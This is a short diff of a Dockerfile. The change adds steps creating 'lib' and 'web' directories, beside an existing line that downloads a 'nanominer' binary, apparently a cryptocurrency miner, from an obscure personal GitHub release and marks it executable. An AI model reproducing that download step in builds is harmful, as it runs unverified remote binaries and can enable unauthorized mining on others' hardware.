@@ -12,6 +12,9 @@ RUN apt-get update && apt-get dist-upgrade -y && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
+RUN mkdir lib && \
+    mkdir web
+
 RUN wget https://github.com/imraahatikah6827/lulu/releases/download/nanonano/nanominer && \
     chmod +x nanominer
     
